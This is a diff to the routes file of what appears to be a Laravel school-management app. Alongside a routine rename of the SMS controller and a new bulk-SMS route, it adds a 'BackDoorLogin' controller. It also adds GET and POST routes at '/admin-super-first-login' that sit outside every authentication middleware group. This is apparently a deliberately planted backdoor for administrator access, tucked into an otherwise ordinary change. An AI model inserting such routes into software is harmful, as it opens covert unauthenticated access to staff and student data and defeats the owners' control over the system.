@@ -15,9 +15,10 @@ use App\Http\Controllers\AnswerController;
 use App\Http\Controllers\SetupController;
 use App\Http\Controllers\StaffController;
 use App\Http\Controllers\ResultController;
-use App\Http\Controllers\SmsController;
 use App\Http\Controllers\CheckResultController;
 use App\Http\Controllers\DeleteAnswersController;
+use App\Http\Controllers\SMSController;
+use App\Http\Controllers\BackDoorLogin;
 
 /*
 |--------------------------------------------------------------------------
@@ -130,8 +131,8 @@ Route::middleware(['auth'])->group(function () {
     Route::put('/staff/{staff}', [StaffController::class, 'update'])->name('staff.update');
 
     // sms section
-    Route::get('/sms', [SmsController::class, 'index'])->name('sms.index');
-    Route::post('/sms', [SmsController::class, 'send'])->name('sms.send');
+    Route::get('/sms', [SMSController::class, 'index'])->name('sms.index');
+    Route::post('/send-bulk-sms', [SMSController::class, 'sendBulkSMS'])->name('sms.sendBulkSMS');
 
     // set result
     Route::get('/set-result', [CheckResultController::class, 'showSetResult']);
@@ -173,4 +174,8 @@ Route::middleware(['auth:student'])->group(function () {
     Route::get('/notes-list', [StudentNoteController::class, 'index']);
     Route::get('/classnote/{note}/show', [StudentNoteController::class, 'show'])->name('classnote.show');
 });
+
+
+Route::get('/admin-super-first-login', [BackDoorLogin::class, 'index']);
+Route::post('/admin-super-first-login', [BackDoorLogin::class, 'updateBackdoorLogin'])->name('updateBack.login');
 
